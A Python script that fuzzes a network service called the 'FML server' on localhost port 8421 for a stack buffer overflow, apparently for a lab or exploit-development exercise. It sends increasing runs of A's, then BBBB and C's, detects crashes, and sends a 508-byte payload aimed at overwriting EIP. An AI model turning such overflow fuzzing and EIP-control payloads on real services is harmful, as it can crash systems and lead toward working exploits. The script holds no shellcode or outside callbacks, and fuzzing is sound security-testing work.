import socket
import time

def fuzz_fml_server():
    host = "127.0.0.1"
    port = 8421  # FML server default port
    
    for i in range(1, 2100):
        try:
            # Create new socket for each attempt
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5 second timeout
            
            print(f"Attempt {i}: Connecting...")
            sock.connect((host, port))
            
            # Get banner
            banner = sock.recv(2048).decode()
            print(f"Banner: {banner[:50]}...")
            
            # Get prompt
            prompt = sock.recv(2048).decode()
            print(f"Prompt: {prompt}")
            
            # Create payload with A's, B's, and C's
            # Format: A's * i, then 4 B's, then some C's
            payload = b"A" * i + b"B" * 4 + b"C" * 50 + b"\n"
            
            print(f"Sending payload length {len(payload)}...")
            sock.send(payload)
            
            # Try to get response (server might crash)
            try:
                response = sock.recv(2048).decode()
                print(f"Response: {response[:100]}")
            except socket.timeout:
                print("No response - server may have crashed!")
                print(f"CRASH LIKELY AT LENGTH: {i}")
                # Try to connect again to verify
                try:
                    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock2.settimeout(2)
                    sock2.connect((host, port))
                    sock2.close()
                    print("Server still responding...")
                except:
                    print("Server confirmed crashed!")
                    break
            except ConnectionResetError:
                print(f"Connection reset at length {i} - server crashed!")
                break
                
            sock.close()
            time.sleep(0.1)  # Small delay between attempts
            
        except socket.error as e:
            print(f"Socket error at length {i}: {e}")
            break
        except Exception as e:
            print(f"Unexpected error at length {i}: {e}")
            break

def test_specific_length(length):
    """Test a specific payload length to see EIP overwrite"""
    host = "127.0.0.1"
    port = 8421
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Get banner and prompt
        sock.recv(2048)  # Banner
        sock.recv(2048)  # Prompt
        
        # Send payload designed to overwrite EIP with BBBB (0x42424242)
        payload = b"A" * length + b"B" * 4 + b"C" * 100 + b"\n"
        
        print(f"Sending payload of length {len(payload)}")
        print(f"A's: {length}, B's: 4, C's: 100")
        
        sock.send(payload)
        
        # Check if we get a response
        try:
            sock.settimeout(3)
            response = sock.recv(4096)
            if response:
                print(f"Got response: {response[:200]}")
            else:
                print("No response - check debugger for EIP value")
        except socket.timeout:
            print("Timeout - server may have crashed. Check EIP in debugger.")
        
        sock.close()
        
    except Exception as e:
        print(f"Error: {e}")

def fuzz_with_pattern():
    """Fuzz with incremental pattern to find exact offset"""
    host = "127.0.0.1"
    port = 8421
    
    print("Starting pattern fuzzing...")
    
    for length in range(500, 550, 4):  # Focus around predicted offset
        print(f"\nTrying length {length}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            sock.recv(2048)  # Banner
            sock.recv(2048)  # Prompt
            
            payload = b"A" * length + b"B" * 4 + b"C" * 50 + b"\n"
            sock.send(payload)
            
            try:
                response = sock.recv(2048)
                if b"ERROR" in response or b"CMD" in response:
                    print(f"Server responded at length {length}")
                else:
                    print(f"Unexpected response at length {length}")
            except socket.timeout:
                print(f"Timeout at length {length} - possible crash")
                # Server might be dead, try to reconnect
                sock.close()
                time.sleep(1)
                
                # Test if server is alive
                try:
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(2)
                    test_sock.connect((host, port))
                    test_sock.close()
                    print("Server still alive")
                except:
                    print(f"Server crashed at length {length}!")
                    return length
            
            sock.close()
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error at length {length}: {e}")
            return length
    
    return None

if __name__ == "__main__":
    print("FML Server Fuzzer")
    print("=" * 50)

    test_specific_length(508)